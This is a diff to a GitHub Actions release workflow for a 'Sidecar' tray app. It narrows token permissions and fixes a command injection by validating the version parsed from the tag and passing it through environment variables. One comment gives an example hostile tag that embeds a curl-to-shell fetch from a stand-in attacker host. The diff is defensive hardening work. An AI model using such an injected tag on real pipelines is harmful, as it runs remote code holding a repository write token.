@@ -12,11 +12,16 @@
 name: Sidecar
 
 on:
+  # No `paths:` filter on this trigger, deliberately. `on.push` takes a single
+  # entry, and a `paths:` filter there applies to the tag refs listed below as
+  # well as to the branch: a `sidecar-v*` tag cut on a CHANGELOG-only commit
+  # would then match no path and the release would silently never happen. A
+  # release that does not fire is far more expensive than a few minutes of
+  # ubuntu build time on a main push that did not touch Sidecar/, so the filter
+  # is dropped here and kept only on pull_request, where there is no tag to be
+  # ambiguous about.
   push:
     branches: [main]
-    paths:
-      - 'Sidecar/**'
-      - '.github/workflows/sidecar.yml'
     tags:
       - 'sidecar-v*'
   pull_request:
@@ -25,8 +30,13 @@ on:
       - '.github/workflows/sidecar.yml'
   workflow_dispatch:
 
+# Read-only by default. `contents: write` is granted to the publish job alone:
+# at workflow level the `test` job inherited it, and that job builds
+# PR-authored code -- MSBuild targets and Directory.Build.props execute during
+# restore, so a pull request could run arbitrary code holding a token that can
+# write to the repository.
 permissions:
-  contents: write
+  contents: read
 
 env:
   DOTNET_NOLOGO: 'true'
@@ -66,6 +76,10 @@ jobs:
     if: startsWith(github.ref, 'refs/tags/sidecar-v')
     runs-on: windows-latest
 
+    # The only job that needs it, and it never builds a pull request.
+    permissions:
+      contents: write
+
     steps:
       - uses: actions/checkout@v4
 
@@ -73,15 +87,43 @@ jobs:
         with:
           dotnet-version: '10.0.x'
 
+      # A git tag may contain $, backticks, (, ), ;, & and |. This value used to
+      # be pasted straight into a pwsh `run:` and a bash assignment by `${{ }}`
+      # substitution, so a tag like `sidecar-v1.0.0$(curl -s attacker/x|sh)`
+      # executed on a runner that held a token with `contents: write`. Two
+      # defences, both needed: the suffix is validated to be nothing but a
+      # three-part number, and it is handed to every later step through `env:`
+      # and referenced as a shell variable rather than substituted into source.
       - name: Read the version from the tag
         id: version
         shell: bash
-        run: echo "value=${GITHUB_REF_NAME#sidecar-v}" >> "$GITHUB_OUTPUT"
+        run: |
+          # GITHUB_REF_NAME is an environment variable, never an expression
+          # substituted into this script.
+          version="${GITHUB_REF_NAME#sidecar-v}"
+
+          case "$version" in
+            *[!0-9.]* | '' )
+              echo "::error::Tag '$GITHUB_REF_NAME' carries characters that are not digits or dots."
+              exit 1
+              ;;
+          esac
+
+          if ! printf '%s' "$version" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "::error::Tag '$GITHUB_REF_NAME' is not sidecar-vMAJOR.MINOR.PATCH. Got '$version'."
+            exit 1
+          fi
+
+          echo "value=$version" >> "$GITHUB_OUTPUT"
+          echo "Releasing sidecar $version."
 
       # Self-contained and single-file so a guildmate needs no .NET runtime.
       # Trimming stays OFF: it breaks WinForms reflection, and a tray app that
       # throws on first paint is worse than a 50 MB download.
       - name: Publish
+        shell: pwsh
+        env:
+          VERSION: ${{ steps.version.outputs.value }}
         run: >-
           dotnet publish Sidecar/src/RoSTools.Sidecar/RoSTools.Sidecar.csproj
           --configuration Release
@@ -90,7 +132,7 @@ jobs:
           -p:PublishSingleFile=true
           -p:PublishTrimmed=false
           -p:IncludeNativeLibrariesForSelfExtract=true
-          -p:Version=${{ steps.version.outputs.value }}
+          "-p:Version=$env:VERSION"
           --output publish
 
       # Unsigned for now, so SmartScreen will warn on first run. To sign, add
@@ -116,8 +158,10 @@ jobs:
       - name: Name the artifact and checksum it
         id: artifact
         shell: bash
+        env:
+          VERSION: ${{ steps.version.outputs.value }}
         run: |
-          name="RoSToolsSidecar-${{ steps.version.outputs.value }}-win-x64.exe"
+          name="RoSToolsSidecar-$VERSION-win-x64.exe"
           mv publish/RoSToolsSidecar.exe "publish/$name"
           ( cd publish && sha256sum "$name" > "$name.sha256" )
           cat "publish/$name.sha256"
